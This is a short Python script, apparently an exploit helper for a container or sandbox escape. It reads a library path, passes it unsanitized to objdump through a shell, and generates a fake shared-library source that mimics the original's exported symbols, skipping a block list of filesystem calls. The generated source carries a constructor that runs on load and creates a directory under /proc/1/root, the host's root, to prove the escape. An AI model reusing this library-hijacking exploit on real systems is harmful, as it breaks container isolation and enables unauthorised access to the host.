import subprocess
so = input()
exploit = """
#include <sys/stat.h>
#include <sys/types.h>
void __attribute__((constructor)) EEEEEEEEEEEEEEEE(){
    mkdir("/proc/1/root/ESCAPE",0755);
}
void XXXXX(){}
"""

black = [
    'select', 'pselect', 'mkdir', 'futimens','utimensat',
    'mkfifoat','mkfifo', 'mknodat', 'mkdirat', 'mknod', 'umask',
    'fchmodat', 'chmod', 'lchmod', 'fchmod', 'lstat', 
    'stat', 'fstat', 'fstatat'
]


result = subprocess.check_output(f"objdump -T {so}", shell=True).decode()[:-1]
result = result.split("\n")
symbol = []
for line in result:
    if ".text" in line:
        sym = line.split(' ')[-1]
        if sym in black or sym.startswith("_"):
            continue
        fake_sym = "void " + sym + "(){};\n"
        symbol.append(fake_sym)
    elif ".data" in line or ".bss" in line:
        sym = line.split(' ')[-1]
        fake_sym = "int " + sym + ";"
        symbol.append(fake_sym)

fp = open("symbol.c", "w")
for s in symbol:
    fp.write(s)
fp.write(exploit)

fp.close()
